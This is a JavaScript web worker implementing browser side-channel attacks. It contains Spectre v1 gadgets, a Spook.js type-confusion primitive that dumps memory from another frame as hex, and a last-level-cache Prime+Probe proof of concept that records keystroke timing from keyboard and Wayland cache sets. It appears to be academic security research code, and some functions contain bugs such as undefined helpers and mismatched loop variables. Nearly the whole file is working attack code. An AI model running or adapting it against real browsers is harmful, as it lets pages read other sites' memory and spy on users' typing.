self.importScripts('leaky-page/leaky-page.js', 'util.js', 'spook.js');

function spectreGadget2() {
    // We want to access as little memory as possible to avoid false positives.
    // Putting arguments in a global array seems to work better than passing them
    // as parameters.
    const object = spectreArgs[0]|0;
    const array  = spectreArgs[1]|0;
    const bit    = spectreArgs[2]|0;
    
    for (let i = 0; i < 200; i++);
    
    if (array < typedArrays[object].f0) {
        return probeArray[((typedArrays[array].length>>bit)&1)*0x800];
    }
    
    return probeArray[0x400];
}

const testBit2 = preventOptimization(function(evictionList1, evictionList2, offset, bit, bitValue) {
    spectreArgs[0] = offset;
    spectreArgs[1] = 0;
    spectreArgs[2] = 0;
    
    // Run the gadget twice to train the branch predictor.
    for (let j = 0; j < 2; j++) {
        spectreGadget2();
    }
    
    evictionList1.traverse();
    
    spectreArgs[0] = offset;
    spectreArgs[1] = offset;
    spectreArgs[2] = bit;
    
    const timing = spectreTimer2.timeCacheSet(bitValue == 1 ? 32 : 0);
    
    return timing > CACHE_L1_THRESHOLD;
});

function leakBit2(evictionList1, evictionList2, offset, bit) {
    let zeroes = 0;
    let ones = 0;
    
    const min_leak_reps = 1;
    const max_leak_reps = 3;
    
    // Our leak is probabilistic. To filter out some noise, we test both for bit 0
    // and 1 repeatedly. If we didn't get a difference in cache hits, continue
    // until we see a diff.
    for (let i = 0; i <  min_leak_reps ; i++) {
        if (testBit2(evictionList1, evictionList2, offset, bit, 0)) zeroes++;
        if (testBit2(evictionList1, evictionList2, offset, bit, 1)) ones++;
    }
    for (let i =  min_leak_reps ; ones == zeroes && i <  max_leak_reps ; i++) {
        if (testBit2(evictionList1, evictionList2, offset, bit, 0)) zeroes++;
        if (testBit2(evictionList1, evictionList2, offset, bit, 1)) ones++;
        if (ones != zeroes) break;
    }
    return ones > zeroes ? 1 : 0;
}

function leakByte2(evictionList1, evictionList2, offset) {
    let byte = 0;
    for (let bit = 0; bit < 8; bit++) {
        byte |= leakBit2(evictionList1, evictionList2, offset, bit) << bit;
    }
    return byte;
}

function spectreGadget3() {
    // We want to access as little memory as possible to avoid false positives.
    // Putting arguments in a global array seems to work better than passing them
    // as parameters.
    const object = spectreArgs[0]|0;
    const array  = spectreArgs[1]|0;
    const bit    = spectreArgs[2]|0;
    const index  = spectreArgs[3]|0;
    
    for (let i = 0; i < 200; i++);
    
    // Leak the 
    if (array < typedArrays[object].f0) {
        return probeArray[((typedArrays[array][index]>>bit)&1)*0x800];
    }
    
    return probeArray[0x400];
}

const testBit3 = preventOptimization(function(evictor, offset, bit, bitValue) {
    spectreArgs[0] = offset;
    spectreArgs[1] = 0;
    spectreArgs[2] = 0;
    
    // Run the gadget twice to train the branch predictor.
    for (let j = 0; j < 2; j++) {
        spectreGadget3();
    }
    
    // Try to evict the length field of our array from memory, so that we can
    // speculate over the length check.
    evictor.traverse();
    
    spectreArgs[0] = offset;
    spectreArgs[1] = offset;
    spectreArgs[2] = bit;
    
    // In the gadget, we access cacheSet 0 if the bit was 0 and set 32 for bit 1.
    const timing = spectreTimer3.timeCacheSet(bitValue == 1 ? 32 : 0);
    
    return timing > CACHE_L1_THRESHOLD;
});

function leakBit3(evictor, offset, bit) {
    let zeroes = 0;
    let ones = 0;
    
    const min_leak_reps = 10;
    const max_leak_reps = 20;
    
    // Our leak is probabilistic. To filter out some noise, we test both for bit 0
    // and 1 repeatedly. If we didn't get a difference in cache hits, continue
    // until we see a diff.
    for (let i = 0; i <  min_leak_reps ; i++) {
        if (testBit3(evictor, offset, bit, 0)) zeroes++;
        if (testBit3(evictor, offset, bit, 1)) ones++;
    }
    for (let i =  min_leak_reps ; ones == zeroes && i <  max_leak_reps ; i++) {
        if (testBit3(evictor, offset, bit, 0)) zeroes++;
        if (testBit3(evictor, offset, bit, 1)) ones++;
        if (ones != zeroes) break;
    }
    return ones > zeroes ? 1 : 0;
}

function leakByte3(evictor, offset) {
    let byte = 0;
    for (let bit = 0; bit < 8; bit++) {
        byte |= leakBit3(evictor, offset, bit) << bit;
    }
    return byte;
}

async function main() {
    const PAGE_SZ = 4096;
    const CACHE_LINE_SZ = 64;

    const data = new Array(0x20).fill(0x5A);

    const result = createHeapReadPrimitive(data);
    if (result === null) {
        return null;
    }

    Object.defineProperty(self, "spectreTimer2", {
        value: new L1Timer(spectreGadget2)
    });
    Object.defineProperty(self, "spectreTimer3", {
        value: new L1Timer(spectreGadget3)
    });

    const {pageOffset, index, leak} = result;

    // Use leaky-page to deduce the correct object to leak with
    //  The proof-of-concept uses this to improve reliability and increase speed of setting spook.js up.
    let objectPageOffset = (pageOffset + 984) % PAGE_SZ;
    //const CACHE_LINE_SZ = 64;
    const OBJECT_LENGTH = 15 * 4;
    const desiredObjectAlignment = 2 * CACHE_LINE_SZ - (16);
    let alignedObjectIndex = 0;
    for (let i = 70; i < 128; i++) {
        if ((objectPageOffset % (2 * CACHE_LINE_SZ)) == desiredObjectAlignment) {
            log(`found object with desired alignment (@0x${objectPageOffset.toString(16)}) index: ${i}`);
            alignedObjectIndex = i;
            break;
        }

        objectPageOffset += OBJECT_LENGTH;
        objectPageOffset %= PAGE_SZ;
    }
    if (alignedObjectIndex == 0) {
        err(ERR_U8_ALIGN, "couldn't create object with right alignment");
        return;
    }

    // Construct an offset from the SpectreV1 array to the end of the last array (chosen arbitrarily)
    const ARRAY_LENGTH = 0xA4;
    const ARRAY_END = 0x20 + ARRAY_LENGTH * (64 - index - 1);

    // Verify that the primitive was constructed correctly.
    let count = 0;
    for (let i = 0; i < 300; i++) {
        if (leak(ARRAY_END - 32) === 0x3F) {
            count++;
        }
    }
    log(`Accuracy of heap read primitive ${count}/300`);
    if (count < 200) {
        err(`Failed to construct heap read primitive.`);
        return;
    }
    log("Heap read primitive successfully constructed.");

    // Calculate an offset to the beginning of the last array
    const ARRAY_START = ARRAY_END - ARRAY_LENGTH + 0x38;

    // Read ext_ptr_2
    const BasePointer = BigInt(
        (mode(100, x => leak(ARRAY_START + 44)) << 0) |
        (mode(100, x => leak(ARRAY_START + 45)) << 8)
    ) << 32n;

    log(`Leaked heap pointer : 0x${BasePointer.toString(16)}`);

    // Read base_ptr
    const ArrayPointer = BigInt(
        (mode(100, x => leak(ARRAY_START + 48)) << 0) |
        (mode(100, x => leak(ARRAY_START + 49)) << 8) |
        (mode(100, x => leak(ARRAY_START + 50)) << 16) |
        (mode(100, x => leak(ARRAY_START + 51)) << 24)
    ) + 0x07n + BasePointer;
    log(`Leaked array pointer: 0x${ArrayPointer.toString(16)}`);

    // Construct spook.js
    const spookjs = await SpookJs.create(typedArrays, {
        index: alignedObjectIndex,
        offset: Math.floor(objectPageOffset / 64),
        verify: {address: ArrayPointer, value: 0x3F}
    });

    if (spookjs === null) {
        err(`Failed to construct spook.js type confusion primitive`);
        return;
    }
    log(`Constructed spook.js type confusion primitive`);

    const address = await getCrossFrameAddress();
    log("Leaking from 0x" + address.toString(16));

    const start = address - 1024n;
    const end = start + 1024n;

    const startTime = performance.now();
    for (let i = start; i < end; i += 16n) {
        const bytes = [];
        for (let offset = 0n; offset < 16n; offset++) {
            bytes.push(spookjs.leak(i + offset));
        }

        const offset = (i - 16n).toString(16);
        const hex = bytes.map(x => x.toString(16).padStart(2, '0')).join(' ');
        const ascii = bytes.map(x => (32 <= x && x <= 126) ? String.fromCharCode(x) : ".").join('');

        log(`0x${offset}  ${hex}  ${ascii}`);
    }
    const endTime = performance.now();
    log(`[*] Leaked 1024 bytes in ${Math.round(endTime - startTime)}ms`);
}

const EVICTION_SET_MAX_SIZE = 64;

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  // While there remain elements to shuffle...
  while (0 !== currentIndex) {

    // Pick a remaining element...
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;

    // And swap it with the current element.
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

const END_MARKER = 0x7FFFFFFF;
class EvictionListL3 {
    constructor(memory, elements) {
        this.elements = elements;
        this.head = elements[0] / 4;
        this.memory = memory;

        this.offset = (elements[0]%PAGE_SZ)/CACHE_LINE_SZ;

        // Link elements together
        for (let i = 1; i < elements.length; i++) {
            memory[elements[i - 1] / 4] = elements[i] / 4;
        }

        memory[elements[elements.length - 1] / 4] = END_MARKER;
    }

    traverse() {
        let element = this.head;
        while (element !== END_MARKER) {
            // this.memory[element + 1]++;
            let start = Atomics.load(this.memory, 64);
            element = this.memory[element];
            let end = Atomics.load(this.memory, 64);
        }
        return element;
    }

    probe(){
        let element = this.head;
        let THRESHOLD = 60;
        let ret = 0;
        while (element !== END_MARKER) {
            /* use Atomics.load to prevent zeroing out */
            let start = Atomics.load(this.memory, 64);
            element = Atomics.load(this.memory, element);
            let end = Atomics.load(this.memory, 64);
            if(!ret && end-start > THRESHOLD){
                ret = 1;
            } 
        }
        return ret;
    }

    prime(assoc){
        let element = this.head;
        let chaser = this.head;
        for(let i = 0; i < assoc/2; i++){
            element = this.memory[element];
        }
        for(let i = 0; i < assoc; i++){
            if(i < assoc/2){
                element = this.memory[element];
            }
            chaser = this.memory[chaser];
        }
    }

    probe_exact(assoc){
        let element = this.head;
        let probe_result = []
        let ret = 0;
        for(let i = 0; i < assoc; i++){
            //this.memory[element + 1]++;
            let start = Atomics.load(this.memory, 64);
            element = this.memory[element]; 
            let end = Atomics.load(this.memory, 64)
            probe_result.push(end-start)
        }
        log(probe_result)
        return probe_result;
    }

    get(index){
        let element = this.head;
        for(let i = 0; i < index; i++){
            element = this.memory[element]
        }
        return element;
    }

    evict_reload(victim, rounds){
        let count = 0;
        for(let i = 0; i < rounds; i++){
            Atomics.load(this.memory, victim/4);
            let element = this.head;
            while (element !== END_MARKER) {
                // this.memory[element + 1]++;
                //
                let start = Atomics.load(this.memory, 64);
                element = Atomics.load(this.memory, element)
                let end = Atomics.load(this.memory, 64);
            }
            if(element == 0) return 0;
            let start = Atomics.load(this.memory, 64);
            Atomics.load(this.memory, victim/4) 
            let end = Atomics.load(this.memory, 64)
            if(end-start > THRESHOLD) count++;
        }
        log(count/rounds)
        if(count / rounds > 0.7) return 1;
        return 0;
    }
}

let messageId = 0;
const messages = [];

class Message {
    constructor(type, payload){
        this.id = messageId++;
        this.type = type;
        this.payload = payload;

        this.promise = new Promise((resolve, reject) => {
            this.resolve = resolve;
            this.reject  = reject;
        });
    }
}

function sendMessage(type, payload = undefined) {
    const message = new Message()
    messages.push(message);
    self.postMessage({type: type, id: message.id, payload: payload});
    return message.promise;
}



function getAccessModules() {
    return sendMessage("getAccessModule");
}

function startTimer() {
    return sendMessage("startTimer");
}

function stopTimer() {
    return sendMessage("stopTimer");
}

function getAddressForDump() {
  return sendMessage("getAddress");
}

function sendLeakage(byteString) {
  return sendMessage("leakage", byteString);
}

function getCrossFrameAddress() {
    return sendMessage("getCrossFrameAddress");
}



/* -------------------- start of inserted code ------------------------ */
// main();

function graphKeystrokes(data){
    return sendMessage("graphKeystrokes", data);
} 

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function assert(condition, message){
    if(!condition){
        throw message || "assertion error";
    }
}

function cross_core_test(evset, rounds){
    transmit_str = "";
    for(let i  = 0; i < 20; i++){
        evset.probe();
    }
    for(let i = 0; i < rounds; i++){
        for(let j = 0; j < rounds; j++){
            // TODO: Test wait state
            let result = evset.probe();
            transmit_str += result + " ";
        }
        transmit_str += "\n";
    }
    log(transmit_str)
}

function intra_process_detection_fp_test(evset, buffer, warmup_rounds, trials, victim){
    /* compute background noise from false-positives */
    let fp = 0;
    for(let i = 0; i < warmup_rounds; i++){
        result = evset.probe();
    }
    for(let i = 0; i < trials; i++){
        let result = evset.probe()
        fp += result; 
        evset.probe();
    }
    log(`false-positive: ${fp/trials}`)

    /* compute detection rate */
    let detect = 0;
    for(let i = 0; i < warmup_rounds; i++){
        result = evset.probe();
    }
    for(let i = 0; i < trials; i++){
        let tmp = Atomics.load(buffer, victim / 4);
        let result = evset.probe();
        detect += result; 
        evset.probe()
    }
    log(`detections: ${detect/trials}`)

    let fp_rate = fp / trials;
    let detect_rate = detect / trials;
    return [detect_rate, fp_rate]
}

function intra_process_transmission_test(evset, buffer, warmup_rounds, transmit_rounds_side, victim){
    let correct = 0;
    let fp = 0;
    let detect = 0;
    for(let i = 0; i < warmup_rounds; i++){
        evset.probe();
    }
    for(let i = 0; i < transmit_rounds_side; i++){
        for(let j = 0; j < transmit_rounds_side; j++){
            let expected = 0;
            evset.probe();
            if((i * transmit_rounds_side + j) % 8 == 0){
                expected = 1;
                let tmp = Atomics.load(buffer, victim/4);
            }
            let result = evset.probe();
            correct += (result == expected)
            if(expected){
                detect += (result == expected) 
            } else{
                fp += (result != expected)
            }
        }
    }   
    log(`Overall Accuracy: ${correct / (transmit_rounds_side * transmit_rounds_side)}`)
    log(`Detection Rate: ${detect / (transmit_rounds_side * transmit_rounds_side / 8)}`)
    log(`False-Positive Rate: ${fp / (transmit_rounds_side * transmit_rounds_side / 8 * 7)}`)
    log("start cross-core attack, please begin transmitting process")
}

function remote_set_profiling(evset){
    let TRANSMIT_ROUNDS_SIDE = 256;
    for(let i  = 0; i < 10; i++){
        evset.probe();
    }

    while(true){
        let count = 0;
        for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
            for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
                count += evset.probe();
            }
        }
        log("detection-rate: " + count / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE))
    }
}


function check_find_all_slices(evset, num_slices){
    let TRANSMIT_ROUNDS_SIDE = 256;
    for(let i  = 0; i < 10; i++){
        for(let j = 0; j < num_slices; j++){
            evset[j].probe();
        }
    }
    
    while(true){
        let count = [0, 0, 0, 0]
        for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
            for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
                for(let k = 0; k < num_slices; k++){
                    count[k] += evset[i].probe();
                }
            }
        }
        for(let i = 0; i < num_slices; i++){
            log(i + ": " + count[i] / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE))
        }
    }
}

const LINE_SIZE = 64;
const NUM_SETS_PER_SLICE = 2048;
const NUM_SLICES = 4;
const THRESHOLD = 60;

async function find_evsets_all_slices(victim, module, memory, buffer, num_call){
    let count = 0;
    let found_sets = [];
    let candidate_set = [];
    let victims = [];
    
    for(let i = victim; i < 128 * 1024 * 1024; i += NUM_SETS_PER_SLICE * LINE_SIZE){
        if(count < 32){
            victims.push(i);
            count++;
            continue;
        } 
        candidate_set.push(i);
    }

    let num_sets = 0;
    let victim_index = 0;
    
    /* out-of-bounds evset search algorithm */
    while(num_sets < NUM_SLICES){
        let victim = victims[victim_index]
        let already_found = false;
        for(let evset of found_sets){
            if(evset.evict_reload(victim, 100)){
                already_found = true;
            } 
        }  
        if(!already_found){
            let set = await build_evset({
                offset: (victim - Math.floor(victim/4096) * 4096)/64,
                module: module,
                memory: memory,
                victim: victim,
                candidate_set: candidate_set
            });
            found_sets.push(new EvictionListL3(buffer, Array.from(set[num_call * NUM_SLICES])))
            num_sets++;
        }

        victim_index++;
    }
    return found_sets;
}

async function find_targeted_evsets(sets, slices, module, memory, buffer){
    let evsets = []
    if(sets.length > slices.length){
        for(let i = 0; i < sets.length-slices.length; i++){
            slices.append(0); // append 0 if slices were not specified     
        } 
    } 
    for(let i = 0; i < sets.length; i++){
        let victim = sets[i] * LINE_SIZE; 
        let ret_sets = find_evsets_all_slices(victim, module, memory, buffer, i); 
        evsets.append(ret_sets[slices[i]]);
    }
    return evsets;
} 

function prime_probe_sec(evsets){
    
    const BUFFER_BYTES = 8*1024*1024;
    let traces = [];
    for(let i = 0; i < evsets.length; i++){
        traces.append(new Uint8Array(BUFFER_BYTES));
        traces[i].fill(0);
    }

    /* warm up the set for prime+probe attack */
    for(let i = 0; i < 10; i++){
        for(let j = 0; j < evsets.length; j++){
            evsets[j].probe();
        }
    }
    
    for(let byte_index = 0; i < BUFFER_BYTES; byte_index++){
        for(let i = 0; i < 8; i++){
            for(let j = 0; j < evsets.length; j++){
                traces[j][byte_index] += (evsets[j].probe() << i);
            }
        }
    }
    
    return traces;
}

// This function provides a proof of concept LLC Prime+Probe attack to recover keystrokes
async function l3pp_keystrokes_poc(){ 

    /* initialize modules and tools */
    const {module, memory} = await getAccessModules();
    const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
    const buffer = new Uint32Array(memory.buffer);
    let {wasm_hit, wasm_miss} = instance.exports;

    // Avoid allocate-on-write optimizations
    buffer.fill(1);
    buffer.fill(0);

    await startTimer();

    // Build eviction sets

    self.importScripts('evsets/main.js');
        
    /* define sets and slices to monitor */
    const KBD_KEYCODE_SET = 366;
    const KEYCODE_SLICE = 3;
    const KBD_EVENT_SET = 413;
    const EVENT_SLICE = 3;
    const WAYLAND_SET = 1746;
    const WAYLAND_SLICE = 3;

    let sets = [KBD_KEYCODE_SET, KBD_EVENT_SET, WAYLAND_SET];
    let slices = [KEYCODE_SLICE, EVENT_SLICE, WAYLAND_SLICE];

    evsets = await find_target_evsets(sets, slices, module, memory, buffer);

    /* typing test begins */
    const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
    const NUM_MEASUREMENTS_MS = 1024;

    let keycode_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
    let event_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
    let wayland_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
   
    let traces = prime_probe_sec(evsets);
    let keycode_traces = traces[0];
    let event_traces = traces[1];
    let wayland_traces = traces[2];

    let end_measurement = Math.floor(performance.now());
    log("end: " + end_measurement)
    let duration = end_measurement - start_measurement;
    log("duration: " + duration)

    for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
        for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
            let keycode_data = keycode_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
            let event_data = event_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
            let wayland_data = wayland_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
            for(let l = 0; l < 8; l++){
                let keycode_result = keycode_data & 1;
                let event_result = event_data & 1;
                let wayland_result = wayland_data & 1;
                keycode_hit_count_per_ms[i] += keycode_result;
                event_hit_count_per_ms[i] += event_result;
                wayland_hit_count_per_ms[i] += wayland_result;
                keycode_data >>= 1;
                event_data >>= 1;
                wayland_data >>= 1;
            }
        }
    }

    await graphKeystrokes({"keycode_data": keycode_hit_count_per_ms, "event_data": event_hit_count_per_ms, "wayland_data": wayland_hit_count_per_ms, "pp_duration": keycode_hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});

    // remote_set_profiling(evset);
    await stopTimer();
}

let trace = {"keycode": [], "event": []}

async function simulate_replays(){ 

    /* initialize modules and tools */
    const {module, memory} = await getAccessModules();
    const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
    const buffer = new Uint32Array(memory.buffer);
    let {wasm_hit, wasm_miss} = instance.exports;

    // Avoid allocate-on-write optimizations
    buffer.fill(1);
    buffer.fill(0);

    await startTimer();

    // Build eviction sets

    self.importScripts('evsets/main.js');
        
    /* define sets and slices to monitor */
    const KBD_KEYCODE_SET = 366;
    const KEYCODE_SLICE = 3;
    const KBD_EVENT_SET = 413;
    const EVENT_SLICE = 3;

    let sets = [KBD_KEYCODE_SET, KBD_EVENT_SET];
    let slices = [KEYCODE_SLICE, EVENT_SLICE];

    evsets = await find_target_evsets(sets, slices, module, memory, buffer);
    
    let sentence_index = 0;
    while(!await getSignal("done")){
        if(await getSignal("start")){
            // clear here to prevent pass-by-reference race conditions
            trace["keycode"] = []
            trace["event"] = []
            await setSignal("ack");
            while(!await getSignal("end")){
                let trace_sec = prime_probe_sec(evsets);
                trace["keycode"].push(trace_sec[0]);
                trace["event"].push(trace_sec[1]);
            }
            sendMessage("sentenceTrace", trace)
            sentence_index++;
        } else {
            await sleep(10);
        }
    }

    await stopTimer();
}

async function getSignal(signal){
    const res = await fetch(`http://localhost:8080/get_${signal}`);
    const ret = await res.json()
    return ret["status"];
}

async function setSignal(signal){
    await fetch(`http://localhost:8080/set_${signal}`, {method: "POST"})
}

self.onmessage = function(event) {
    data = event.data;
    // Dispatch to the correct message
    for (let i = 0; i < messages.length; i++) {
        if (messages[i].id === data.id) {
            message = messages[i];
            messages[i] = messages[messages.length - 1];
            messages.pop();

            message.resolve(data.result);
            return;
        }
    }

    // Unhandled message
    const text = JSON.stringify(data);
    self.postMessage({type: 'exception', message: `Unhandled message (Worker): ${text}`});
}

simulate_replays();
